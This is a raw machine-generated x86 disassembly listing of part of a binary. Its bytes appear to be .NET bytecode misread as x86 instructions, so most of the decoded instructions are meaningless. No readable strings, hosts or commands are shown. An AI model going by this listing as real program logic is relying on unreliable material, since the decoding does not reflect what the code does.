  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 d2             	es jb  0x4036a4
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	e4 23                	in     $0x23,%al
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 4e 21 00       	and    $0x214e72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 ea                	jb     0x403764
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 00 24 00       	and    $0x240072,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 0a 24 00       	and    $0x240a72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 14 24 00       	and    $0x241472,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 1a                	jb     0x4037e7
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 2e             	or     0x2e(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	32 24 00             	xor    (%eax,%eax,1),%ah
  4037ec:	70 72                	jo     0x403860
  4037ee:	3c 24                	cmp    $0x24,%al
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 48             	or     0x48(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	54                   	push   %esp
  4037fe:	24 00                	and    $0x0,%al
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 60 24 00       	and    $0x246072,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 6a 24 00       	and    $0x246a72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 7a 24 00       	and    $0x247a72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 86             	or     -0x7a(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	7a 24                	jp     0x403883
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 90             	or     -0x70(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	0a 24 00             	or     (%eax,%eax,1),%ah
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 9c 24 00       	and    $0x249c72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 b4 24 00       	and    $0x24b472,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 c6 24 00       	and    $0x24c672,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 da 24 00       	and    $0x24da72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 ee 24 00       	and    $0x24ee72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 48                	jb     0x40393d
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 f8 24 00       	and    $0x24f872,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 04             	adc    %esi,0x4(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 0a             	or     0xa(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 36             	or     0x36(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 74    	or     0x74720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 8c                	jb     0x4039a2
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 94             	add    %dh,-0x6c(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 8c                	jb     0x4039d3
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 48             	add    %dh,0x48(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
